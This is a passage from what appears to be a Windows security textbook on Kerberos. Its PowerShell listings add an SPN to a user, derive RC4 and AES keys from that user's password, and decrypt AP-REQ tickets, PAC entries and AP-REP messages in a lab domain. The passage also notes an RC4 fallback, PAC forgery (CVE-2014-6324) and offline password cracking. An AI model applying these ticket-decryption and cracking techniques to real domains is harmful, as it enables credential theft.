PS&gt; <b>$credin = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Inbound</b>
PS&gt; <b>$server = New-LsaServerContext -CredHandle $credin</b>
PS&gt; <b>Update-LsaServerContext -Server $server -Token $client.Token</b>
PS&gt; <b>Use-NtObject($token = Get-LsaAccessToken $server) {</b>
   <b>Get-NtLogonSession $token | Format-Table</b>
<b>}</b>
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> LogonId           UserName      LogonType SessionId
-------           --------      --------- ---------
00000000-01214E12 MINERAL\alice Network   0
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-4: Authenticating using the RestrictedKrbHost SPN</span></p>
<p class="TX">Here, we change the SPN to use the <samp class="SANS_TheSansMonoCd_W5Regular_11">RestrictedKrbHost</samp> service class for the current computer name <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. We then complete the authentication, as in Listings 14-2 and 14-3. Note the change in the SPN provided in the AP-REQ message <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. This time, when we update the server authentication context the operation succeeds, so we can extract the generated <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object and display the logon session <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>.</p>
<p class="TX">In <a href="chapter14.xhtml#Lis14-5">Listing 14-5</a>, we test mutual authentication and view the returned AP-REP message.</p>
<span id="Lis14-5"></span><pre><code><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$client = New-LsaClientContext -CredHandle $credout</b>
<b>-Target "RestrictedKrbHost/$env:COMPUTERNAME" -RequestAttribute MutualAuth</b>
PS&gt; <b>Format-LsaAuthToken -Token $client.Token</b>
&lt;KerberosV5 KRB_AP_REQ&gt;
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> Options         : MutualAuthRequired
<var>--snip--</var>

PS&gt;<b> $server = New-LsaServerContext -CredHandle $credin</b>
PS&gt; <b>Update-LsaServerContext -Server $server -Token $client.Token</b>
PS&gt; <b>$ap_rep = $server.Token</b>
PS&gt; <b>$ap_rep | Format-LsaAuthToken</b>
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> &lt;KerberosV5 KRB_AP_REP&gt;
&lt;Encrypted Part&gt;
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> Encryption Type : AES256_CTS_HMAC_SHA1_96
Cipher Text     :
00000000: 32 E1 3F FC 25 70 51 29 51 AE 4E AC B9 BD 58 72
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-5: Enabling mutual authentication</span></p>
<p class="TX"><span aria-label=" Page 469. " epub:type="pagebreak" id="pg_469" role="doc-pagebreak"></span>We enable mutual authentication by specifying the <samp class="SANS_TheSansMonoCd_W5Regular_11">MutualAuth</samp> request attribute flag when creating the client authentication context <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. In the AP-REQ message, we see that a <samp class="SANS_TheSansMonoCd_W5Regular_11">MutualAuthRequired</samp> flag is set <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, which requires the service to return an AP-REP message. When we format the server’s authentication token, we see the AP-REP message, which contains only an encrypted value <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. The encryption key information <span aria-label="annotation4" class="CodeAnnotationCode">❹</span> doesn’t have a key version number, as this is encrypted by the session key, not a shared encryption key.</p>
</section>
<section aria-labelledby="sec5" epub:type="division">
<h3 class="H1" id="sec5"><span id="h1-104"></span><samp class="SANS_Futura_Std_Bold_B_11">Decrypting the AP-REQ Message</samp></h3>
<p class="TNI1">Once we receive an AP-REQ message, we’ll want to decrypt it. But so far, we’ve encrypted all the tickets in our examples using a key derived from the computer’s password. While we might be able to extract this password for use in the decryption operation, doing so would require a lot of additional work. How can we decrypt the ticket for the AP-REQ message with the least amount of effort?</p>
<p class="TX">One approach is to specify an SPN that causes the TGS to use our own password. We can then derive the encryption key based on the account password we control to decrypt the ticket. You can add an SPN to your user account using the <samp class="SANS_TheSansMonoCd_W5Regular_11">setspn</samp> utility or the <samp class="SANS_TheSansMonoCd_W5Regular_11">Set-ADUser</samp> PowerShell command. You’ll need to do this as a domain administrator; otherwise, you won’t have the Active Directory access necessary to configure it. The following command adds the SPN <samp class="SANS_TheSansMonoCd_W5Regular_11">HTTP/graphite</samp> to the <i>alice</i> user:</p>
<pre><code>PS&gt; <b>Set-ADUser -Identity alice -ServicePrincipalNames @{Add="HTTP/graphite"}</b>
</code></pre>
<p class="TX">You can also use this command to remove SPNs by changing <samp class="SANS_TheSansMonoCd_W5Regular_11">Add</samp> to <samp class="SANS_TheSansMonoCd_W5Regular_11">Remove</samp>. The SPN can be almost arbitrary, but it’s a best practice to stick to known service classes and hosts.</p>
<p class="TX">We can now run the script to perform the authentication with the new SPN. <a href="chapter14.xhtml#Lis14-6">Listing 14-6</a> shows the resulting AP-REQ.</p>
<span id="Lis14-6"></span><pre><code>PS&gt; <b>$credout = New-LsaCredentialHandle -Package "Kerberos" -UseFlag Outbound</b>
PS&gt; <b>$client = New-LsaClientContext -CredHandle $credout -Target </b>
<b>"HTTP/graphite"</b>
PS&gt; <b>Format-LsaAuthToken -Token $client.Token</b>
&lt;KerberosV5 KRB_AP_REQ&gt;
Options         : None
&lt;Ticket&gt;
Ticket Version  : 5
Server Name     : SRV_INST - HTTP/graphite
Realm           : MINERAL.LOCAL
Encryption Type : ARCFOUR_HMAC_MD5
Key Version     : 3
Cipher Text     :
00000000: 1A 33 03 E3 04 47 29 99 AF B5 E0 5B 6A A4 B0 D9
00000010: BA 7E 9F 84 C3 BD 09 62 57 B7 FB F7 86 3B D7 08
<var>--snip--</var>
00000410: AF 74 71 23 96 D6 30 01 05 9A 89 D7
<span aria-label=" Page 470. " epub:type="pagebreak" id="pg_470" role="doc-pagebreak"></span>&lt;Authenticator&gt;
Encryption Type : ARCFOUR_HMAC_MD5
Cipher Text     :
00000000: 72 30 A1 25 F1 CC DD B2 C2 7F 61 8B 36 F9 37 B5
00000010: 0C D8 17 6B BB 60 D3 04 6E 3A C4 67 68 3D 90 EE
<var>--snip--</var>
00000180: 5E 91 16 3A 5F 7B 96 35 91
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-6: The AP-REQ for the HTTP/graphite SPN</span></p>
<p class="TX">If you examine this output, you’ll see that not much has changed, but we can at least confirm that the ticket relates to the SPN we specified. This means we can request a ticket for the service that should map to the user. One other change is that the encryption type is now RC4 rather than AES. This is due to an odd behavior of Kerberos in Windows: when the SPN is assigned to a user, the encryption type defaults to RC4. This is good news for us, as RC4 is much simpler to decrypt, as you’ll soon see. Note also that the key version number is set, indicating that the ticket is encrypted with the shared encryption key.</p>
<p class="TX">Before we can decrypt this ticket, we need to generate a key for the encryption algorithm. Generating an RC4 key is easy: we simply calculate the MD4 hash of the Unicode password on which it is based. We’ve seen this operation before: this key is identical to the NT hash used in NTLM, and not by coincidence. When Microsoft introduced the RC4 algorithm into Kerberos, it used the NT hash to support existing users without requiring them to update their passwords to generate new encryption keys. The use of the RC4 algorithm also circumvents difficulties involving cryptography export restrictions.</p>
<p class="TX">If we supply the user’s password, we can generate the RC4 Kerberos key using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-KerberosKey</samp> PowerShell command, as shown in <a href="chapter14.xhtml#Lis14-7">Listing 14-7</a>.</p>
<span id="Lis14-7"></span><pre><code>PS&gt; <b>$key = Get-KerberosKey -Password "</b><b><var>AlicePassw0rd</var></b><b>" -KeyType ARCFOUR_HMAC_MD5</b>
<b>-NameType SRV_INST -Principal "HTTP/graphite@mineral.local"</b>
PS&gt; <b>$key.Key | Out-HexDump</b>
C0 12 36 B2 39 0B 9E 82 EE FD 6E 8E 57 E5 1C E1
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-7: Generating an RC4 Kerberos key for the SPN</span></p>
<p class="TX">Note that you must use the valid password of the user account with which you’re running the example.</p>
<aside aria-label="box-3" class="box">
<p class="BoxTitle" id="box-3"><samp class="SANS_Dogma_OT_Bold_B_11">GENERATING AES KEYS</samp></p>
<p class="BoxBodyFirst"><samp class="SANS_Futura_Std_Book_11">Generating an RC4 key from a password is easy, as the final key relies on no other information. Nevertheless, this design leads to some interesting problems: for example, if two accounts share the same password, they can decrypt each other’s tickets. Also, the decryption implementation in the PowerShell module</samp> <span aria-label=" Page 471. " epub:type="pagebreak" id="pg_471" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Book_11">can brute-force a key in cases where the principal is incorrect or the key number doesn’t match.</samp></p>
<p class="BoxBody"><samp class="SANS_Futura_Std_Book_11">However, AES keys are a different matter. AES uses the</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">Password-Based Key Derivation Function 2 (PBKDFv2)</samp> <samp class="SANS_Futura_Std_Book_11">algorithm to calculate an intermediate key based on the password, then uses this key to generate the final key. PBKDFv2 needs three values to generate the intermediate key: the password, a salt value to make the key harder to brute-force, and the number of iterations for which the generation algorithm should execute.</samp></p>
<p class="BoxBody"><samp class="SANS_Futura_Std_Book_11">By default, the algorithm uses 4,096 iterations, and it derives the salt from the principal name by concatenating the uppercase form of the realm with the client’s name. For example,</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">alice@mineral.local</samp> <samp class="SANS_Futura_Std_Book_11">would create the salt</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">MINERAL .LOCALalice</samp><samp class="SANS_Futura_Std_Book_11">, while the SPN we used,</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">HOST/graphite@mineral.local</samp><samp class="SANS_Futura_Std_Book_11">, would generate</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">MINERAL.LOCALhostgraphite</samp><samp class="SANS_Futura_Std_Book_11">. Using just the SPN to derive the key will produce an incorrect result, so you should specify the salt explicitly when calling</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-KerberosKey</samp><samp class="SANS_Futura_Std_Book_11">, as shown here:</samp></p>
<pre><code><samp class="SANS_TheSansMonoCd_W5Regular_11">PS&gt;</samp> <samp class="SANS_TheSansMonoCd_W7Bold_B_11">$aes_key</samp> <samp class="SANS_TheSansMonoCd_W7Bold_B_11">=</samp> <samp class="SANS_TheSansMonoCd_W7Bold_B_11">Get-KerberosKey -Password "AlicePassw0rd"</samp>
<samp class="SANS_TheSansMonoCd_W7Bold_B_11">-KeyType AES256_CTS_HMAC_SHA1_96 -NameType SRV_INST</samp>
<samp class="SANS_TheSansMonoCd_W7Bold_B_11">-Principal "HTTP/graphite@mineral.local" -Salt "MINERAL.LOCALalice"</samp>
<samp class="SANS_TheSansMonoCd_W5Regular_11">PS&gt;</samp> <samp class="SANS_TheSansMonoCd_W7Bold_B_11">$aes_key.Key | Out-HexDump</samp>
<samp class="SANS_TheSansMonoCd_W5Regular_11">CF 30 3E 2D BB FA 29 1D EF 87 C1 79 B2 18 7A AD</samp>
<samp class="SANS_TheSansMonoCd_W5Regular_11">D3 38 77 27 51 C2 5E C3 C8 DD D8 01 CC AC 0A A9</samp>
</code></pre>
</aside>
<p class="TX">We can now pass the AP-REQ authentication token and the key to the <samp class="SANS_TheSansMonoCd_W5Regular_11">Unprotect-LsaAuthToken</samp> PowerShell command to decrypt the ticket and authenticator. By passing the decrypted authentication token to the <samp class="SANS_TheSansMonoCd_W5Regular_11">Format-LsaAuthToken</samp> command, we can display the unprotected information. As the decrypted ticket is quite large, we’ll inspect it in parts, starting in <a href="chapter14.xhtml#Lis14-8">Listing 14-8</a>.</p>
<span id="Lis14-8"></span><pre><code>PS&gt; <b>$ap_req = Unprotect-LsaAuthToken -Token $client.Token -Key $key</b>
PS&gt; <b>$ap_req | Format-LsaAuthToken</b>
&lt;KerberosV5 KRB_AP_REQ&gt;
Options         : None
&lt;Ticket&gt;
Ticket Version  : 5
Server Name     : SRV_INST - HTTP/graphite
Realm           : MINERAL.LOCAL
Flags           : Forwardable, Renewable, PreAuthent, EncPARep
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> Client Name     : PRINCIPAL - alice
Client Realm    : MINERAL.LOCAL
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> Auth Time       : 5/12 5:37:40 PM
Start Time      : 5/12 5:43:07 PM
End Time        : 5/13 3:37:40 AM
Renew Till Time : 5/19 5:37:40 PM
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-8: The basic decrypted ticket information</span></p>
<p class="TX"><span aria-label=" Page 472. " epub:type="pagebreak" id="pg_472" role="doc-pagebreak"></span>The unencrypted ticket begins at the <samp class="SANS_TheSansMonoCd_W5Regular_11">Realm</samp> value. Most of what follows is bookkeeping information, including flags that do things like indicate the fact that pre-authentication occurred (<samp class="SANS_TheSansMonoCd_W5Regular_11">PreAuthent</samp>). The <samp class="SANS_TheSansMonoCd_W5Regular_11">Forwardable</samp> flag is related to delegation, a topic we’ll come back to in <span class="Xref">“Kerberos Delegation” on page 479</span>. The ticket also contains the SPN of the user being authenticated <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. Because the <i>alice</i> user requested the ticket for the <samp class="SANS_TheSansMonoCd_W5Regular_11">HTTP/graphite</samp> service, this user’s information is what is being authenticated. Next, we see that the ticket has a limited lifetime, in this case based on the authentication time <span aria-label="annotation2" class="CodeAnnotationCode">❷</span> and an end time, making it valid for around 10 hours. When the ticket expires, the client can renew it for another five days. (The <samp class="SANS_TheSansMonoCd_W5Regular_11">Renewable</samp> flag encodes information about the ability to renew the ticket.)</p>
<p class="TX"><a href="chapter14.xhtml#Lis14-9">Listing 14-9</a> shows the next component of the ticket: the randomly generated session key.</p>
<span id="Lis14-9"></span><pre><code>&lt;Session Key&gt;
Encryption Type : ARCFOUR_HMAC_MD5
Encryption Key  : 27BD4DE38A47B87D08E03500DF116AB5
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-9: The ticket session key</span></p>
<p class="TX">This session key is used to encrypt the authenticator. The client and server might also use it to encrypt and verify any subsequent keys or data they transmit.</p>
<p class="TX">After this is a list of authorization data values that the server can use to determine the security properties of the client user. The most important of these is the PAC, which contains everything the receiving Windows system needs to build a <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object for the user. The PAC is itself split into multiple parts. <a href="chapter14.xhtml#Lis14-10">Listing 14-10</a> contains its logon information.</p>
<span id="Lis14-10"></span><pre><code>&lt;Authorization Data - AD_WIN2K_PAC&gt;
&lt;PAC Entry Logon&gt;
&lt;User Information&gt; <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>
Effective Name   : alice
Full Name        : Alice Roberts
User SID         : S-1-5-21-1195776225-522706947-2538775957-1110
Primary Group    : MINERAL\Domain Users
Primary Group SID: S-1-5-21-1195776225-522706947-2538775957-513
&lt;Groups&gt; <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>
MINERAL\Domain Users            - Mandatory, EnabledByDefault, Enabled
&lt;Resource Groups&gt; <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>
Resource Group   : S-1-5-21-1195776225-522706947-2538775957 <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>
MINERAL\Local Resource          - Mandatory, EnabledByDefault, Enabled, Resource
&lt;Extra Groups&gt; <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>
NT AUTHORITY\Claims Valid       - Mandatory, EnabledByDefault, Enabled
Authentication authority asserted identity - Mandatory, EnabledByDefault, Enabled
&lt;Account Details&gt; <span aria-label="annotation6" class="CodeAnnotationCode">❻</span>
Logon Time       : 5/12 5:37:15 PM
Password Last Set: 5/8 11:07:55 AM
Password Change  : 5/9 11:07:55 AM
Logon Count      : 26
Bad Password #   : 0
<span aria-label=" Page 473. " epub:type="pagebreak" id="pg_473" role="doc-pagebreak"></span>Logon Server     : PRIMARYDC
Logon Domain     : MINERAL
Logon Domain SID : S-1-5-21-1195776225-522706947-2538775957 <span aria-label="annotation7" class="CodeAnnotationCode">❼</span>
User Flags       : ExtraSidsPresent, ResourceGroupsPresent
User Account Cntl: NormalAccount, DontExpirePassword
Session Key      : 00000000000000000000000000000000 <span aria-label="annotation8" class="CodeAnnotationCode">❽</span>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-10: The logon PAC entry</span></p>
<p class="TX">The logon PAC entry follows the format used in the Netlogon protocol prior to Windows 2000. It starts with basic user information <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>, such as the user’s name, SID, and primary group. Next comes the list of group memberships, split into three parts: domain groups <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, resource groups <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>, and extra groups <span aria-label="annotation5" class="CodeAnnotationCode">❺</span>. For each group, the SID (formatted as a name if known) and the attributes that should apply to it are shown. For size reasons, the domain and resource group SIDs are only stored using the last RID value. The full SIDs are derived by adding this RID to the logon domain SID <span aria-label="annotation7" class="CodeAnnotationCode">❼</span> or the resource group SID <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>, respectively. The extra groups list stores the full SIDs and so can contain SIDs with different prefixes.</p>
<p class="TX">After the group information is additional bookkeeping about the user, such as when they last logged on and changed their password <span aria-label="annotation6" class="CodeAnnotationCode">❻</span>. This section also includes information about the server and domain that authenticated the user, including the domain name and SID. The user flags show that the extra and resource groups are present in the ticket. The user account control flags indicate properties of the account (in this case, that the user’s password doesn’t expire).</p>
<p class="TX">Finally, there is an empty session key consisting of all zeros <span aria-label="annotation8" class="CodeAnnotationCode">❽</span>. You’ll find a non-empty session key only if the KDC didn’t directly authenticate the user and instead used another authentication protocol, such as NTLM. In this case the session key for that sub-authentication protocol will be shown here; however, in most cases it will be empty.</p>
<p class="TX"><a href="chapter14.xhtml#Lis14-11">Listing 14-11</a> shows the next PAC entry, which contains the user’s claim attributes.</p>
<span id="Lis14-11"></span><pre><code>&lt;PAC Entry UserClaims&gt;
&lt;ActiveDirectory Claim&gt;
ad://ext/cn:88d7f6d41914512a - String - Alice Roberts
ad://ext/country:88d7f5009d9f2815 - String - US
ad://ext/department:88d7f500a308c4a9 - String - R&amp;D
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-11: The user claims PAC entry</span></p>
<p class="TX">As mentioned in <span class="Xref"><a href="chapter4.xhtml">Chapter 4</a></span>, the <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object exposes these user claims as security attributes, and they can play a role in the access control process, typically through a central access policy. If the target SPN is a computer account rather than a user account, the Kerberos ticket will also include information about the client device in the form of device groups and device claims, as shown in <a href="chapter14.xhtml#Lis14-12">Listing 14-12</a>.</p>
<span id="Lis14-12"></span><pre><code><span aria-label=" Page 474. " epub:type="pagebreak" id="pg_474" role="doc-pagebreak"></span>&lt;PAC Entry Device&gt;
Device Name      : MINERAL\GRAPHITE$
Primary Group    : MINERAL\Domain Computers
&lt;Groups&gt;
MINERAL\Domain Computers       - Mandatory, EnabledByDefault, Enabled
&lt;Domain Groups&gt;
NT AUTHORITY\Claims Valid      - Mandatory, EnabledByDefault, Enabled
&lt;Extra Groups&gt;
Authentication authority asserted identity - Mandatory, EnabledByDefault, Enabled

&lt;PAC Entry DeviceClaims&gt;
&lt;ActiveDirectory Claim&gt;
ad://ext/cn:88d7f6d41914512a - String - GRAPHITE
ad://ext/operatingSystem:88d7f6d534791d12 - String - Windows Enterprise
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-12: The device groups and device claims PAC entries</span></p>
<p class="TX">As with the user claims, you’ll typically only find these used in a central access policy. <a href="chapter14.xhtml#Lis14-13">Listing 14-13</a> shows additional bookkeeping entries.</p>
<span id="Lis14-13"></span><pre><code>&lt;PAC Entry ClientInfo&gt;
Client ID        : 5/12 5:37:40 PM
Client Name      : alice

&lt;PAC Entry UserPrincipalName&gt;
Flags            : None
Name             : alice@mineral.local
DNS Name         : MINERAL.LOCAL
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-13: The client info and UPN PAC entries</span></p>
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">Client ID</samp> field should match the user’s authentication time.</p>
<p class="TX"><a href="chapter14.xhtml#Lis14-14">Listing 14-14</a> shows a couple of signatures applied to the PAC data to ensure it hasn’t been tampered with. Without these signatures, the user could forge their own PAC, adding any groups they would like the LSA to place in their <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object.</p>
<span id="Lis14-14"></span><pre><code>&lt;PAC Entry ServerChecksum&gt;
Signature Type   : HMAC_MD5
Signature        : 7FEA93110C5E193734FF5071ECC6B3C5

&lt;PAC Entry KDCChecksum&gt;
Signature Type   : HMAC_SHA1_96_AES_256
Signature        : 9E0689AF7CFE1445EBACBF88

&lt;PAC Entry TicketChecksum&gt;
Signature Type   : HMAC_SHA1_96_AES_256
Signature        : 1F97471A222BBCDE8EC717BC
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-14: PAC signatures</span></p>
<p class="TX">The first signature covers the entire PAC. However, as the signature fields are embedded inside the PAC, they’re replaced with zeros during the <span aria-label=" Page 475. " epub:type="pagebreak" id="pg_475" role="doc-pagebreak"></span>signature calculation. This signature is generated using the shared key used to encrypt the ticket.</p>
<p class="TX">The second signature is used to verify that the server signature was issued by the KDC. This signature covers only the server and uses the encryption key for the <i>krbtgt</i> user. To verify the signature, the server needs to send it to the KDC, as it doesn’t know the encryption key. For performance reasons, it’s common to not perform this validation when the server is running as a privileged user such as <i>SYSTEM</i>.</p>
<p class="TX">The final signature is calculated from the entire ticket with the PAC removed. The encryption key used for the signature is the one for the <i>krbtgt</i> user. This signature allows the KDC to detect any tampering of the ticket, which the server signature wouldn’t cover, as it verifies only the PAC.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>Windows has faced multiple security issues related to PAC signature verification. Most notable is CVE-2014-6324, which occurred because the TGS accepted CRC32 as a valid signature mechanism. As CRC32 is not cryptographically secure and can be trivially brute-forced, an attacker could create a valid PAC containing any groups they liked, including the full domain administrator.</i></p>
</blockquote>
<p class="TX"><a href="chapter14.xhtml#Lis14-15">Listing 14-15</a> shows the final component of the decrypted AS-REQ message, the authenticator.</p>
<span id="Lis14-15"></span><pre><code>&lt;Authenticator&gt;
Client Name     : PRINCIPAL - alice
Client Realm    : MINERAL.LOCAL
Client Time     : 5/13 2:15:03 AM
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> Checksum        : GSSAPI
Channel Binding : 00000000000000000000000000000000
Context Flags   : None
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> &lt;Sub Session Key&gt;
Encryption Type : ARCFOUR_HMAC_MD5
Encryption Key  : B3AC3B1C31937088B7B1BC880B10950E
<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> Sequence Number : 0x7DDD0DBA
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> &lt;Authorization Data - AD_ETYPE_NEGOTIATION&gt;
AES256_CTS_HMAC_SHA1_96, AES128_CTS_HMAC_SHA1_96, ARCFOUR_HMAC_MD5
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-15: The decrypted AS-REQ authenticator</span></p>
<p class="TX">The authenticator contains some basic user information, as well as a timestamp indicating when it was created on the client that can be used to confirm the request is recent and has not been replayed to the service.</p>
<p class="TX">One odd thing you might notice is that a <samp class="SANS_TheSansMonoCd_W5Regular_11">Checksum</samp> field is present, but it doesn’t appear to contain a valid cryptographic hash <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. This is because the authenticator has repurposed this field to store additional information, as indicated by the type value <samp class="SANS_TheSansMonoCd_W5Regular_11">GSSAPI</samp>. By default, this field contains the channel binding for the connection, if specified, and some additional flags. In this case, no channel binding is set, so the <samp class="SANS_TheSansMonoCd_W5Regular_11">Channel Binding</samp> field contains all zeros. If you were to specify a <samp class="SANS_TheSansMonoCd_W5Regular_11">ChannelBinding</samp> parameter in the same way we did when using NTLM, the field would look something like this:</p>
<pre><code>Channel Binding : BAD4B8274DC394EDC375CA8ABF2D2AEE
</code></pre>
<p class="TX"><span aria-label=" Page 476. " epub:type="pagebreak" id="pg_476" role="doc-pagebreak"></span>The authenticator contains a sub-session key <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>, which the connection can use going forward. It also contains a randomly generated sequence number <span aria-label="annotation3" class="CodeAnnotationCode">❸</span> that, along with the timestamp, can thwart replay attacks that attempt to use the same ticket and authenticator. Finally, the authenticator can contain additional authorization data <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. In this case, the data specifies the <samp class="SANS_TheSansMonoCd_W5Regular_11">AD_ETYPE_NEGOTIATION</samp> type, which allows the connection to try to upgrade the encryption algorithm used from RC4 to one of the AES encryption formats.</p>
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">GSSAPI</samp> type value used in <a href="chapter14.xhtml#Lis14-15">Listing 14-15</a> represents the <i>Generic Security Services Application Program Interface (GSSAPI)</i>, a general API for implementing network authentication protocols. You would use GSSAPI instead of SSPI on Linux or macOS to perform Kerberos authentication. RFC2743 and RFC2744 define the current version of GSSAPI, while RFC4121 defines the protocol’s Kerberos-specific implementation.</p>
<p class="TX">SSPI is mostly compatible with GSSAPI, and it’s common to find network protocol documentation that refers to the GSSAPI names of the functions to use, especially for encryption and signatures. For example, to encrypt and decrypt data in GSSAPI, you would use the <samp class="SANS_TheSansMonoCd_W5Regular_11">GSS_Wrap</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">GSS_Unwrap</samp> functions, respectively, instead of the SSPI <samp class="SANS_TheSansMonoCd_W5Regular_11">EncryptMessage</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">DecryptMessage</samp> APIs. Similarly, for signature generation and verification, you would use <samp class="SANS_TheSansMonoCd_W5Regular_11">GSS_GetMIC</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">GSS_VerifyMIC</samp> instead of <samp class="SANS_TheSansMonoCd_W5Regular_11">MakeSignature</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">VerifySignature</samp>. As this is a book on Windows security, we won’t dwell on the intricacies of GSSAPI any further.</p>
</section>
<section aria-labelledby="sec6" epub:type="division">
<h3 class="H1" id="sec6"><span id="h1-105"></span><samp class="SANS_Futura_Std_Bold_B_11">Decrypting the AP-REP Message</samp></h3>
<p class="TNI1">Once we’ve decrypted the AP-REQ message’s ticket and authenticator, we have the key we need to decrypt the AP-REP used for mutual authentication. We do so in <a href="chapter14.xhtml#Lis14-16">Listing 14-16</a>.</p>
<span id="Lis14-16"></span><pre><code>PS&gt; <b>$sesskey = (Unprotect-LsaAuthToken -Token $ap_req -Key $key).Ticket.Key</b>
PS&gt; <b>Unprotect-LsaAuthToken -Token $ap_rep -Key $sesskey | Format-LsaAuthToken</b>
&lt;KerberosV5 KRB_AP_REP&gt;
&lt;Encrypted Part&gt;
Client Time      : 05-14 01:48:39
&lt;Sub Session Key&gt;
Encryption Type : AES256_CTS_HMAC_SHA1_96
Encryption Key  : 76F0794F1F3B8CE10C38CFA98BF74AF5229C7F626110C6302E4B8780AE91FD3A
Sequence Number : 0x699181B8
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 14-16: Decrypting the AP-REP message</span></p>
<p class="TX">We first need to get the session key from the decrypted AP-REQ ticket. With that key, we can decrypt the AP-REP using <samp class="SANS_TheSansMonoCd_W5Regular_11">Unprotect-LsaAuthToken</samp> once again. In the output, you can see the newly negotiated session key; in this case, it’s been upgraded from RC4 to an AES key. It also includes a sequence number to prevent replay attacks.</p>
<aside aria-label="box-4" class="box">
<p class="BoxTitle" id="box-4"><span aria-label=" Page 477. " epub:type="pagebreak" id="pg_477" role="doc-pagebreak"></span><samp class="SANS_Dogma_OT_Bold_B_11">USING A PUBLIC KEY IN THE INITIAL AUTHENTICATION</samp></p>
<p class="BoxBodyFirst"><samp class="SANS_Futura_Std_Book_11">One big weakness of Kerberos, especially for normal users, is its reliance on the password to derive encryption keys. Tickets and associated encrypted data are commonly transferred over insecure networks, so an attacker could easily collect a large body of ciphertext associated with a single user and attempt to crack their password. If they succeed, they’ll completely compromise that user’s security.</samp></p>
<p class="BoxBody"><samp class="SANS_Futura_Std_Book_11">To limit this risk, you can configure Windows Kerberos to use</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">Public Key Initial Authentication (PKINIT)</samp><samp class="SANS_Futura_Std_Book_11">. PKINIT relies on public key cryptography to perform the initial session key exchange, rather than using shared encryption keys derived from passwords. The public key cryptography in PKINIT authenticates the user with standard X.509 certificates, which the system typically stores, along with the associated private key, on a smart card that the user must insert into the Windows computer before authenticating.</samp></p>
<p class="BoxBody"><samp class="SANS_Futura_Std_Book_11">Rather than encrypting a timestamp with the shared encryption key as part of the pre-authentication data, to prove possession of the key when sending the initial AS-REQ message to the KDC the client uses its public key certificate to sign an identifier, then sends it to the KDC along with a copy of the certificate it used. The KDC can verify the signature, which proves the client’s possession of the corresponding private key, and check that the PKI policy allows the certificate (by making sure it has the correct root certificate authority and Extended Key Usages, or EKUs, for example).</samp></p>
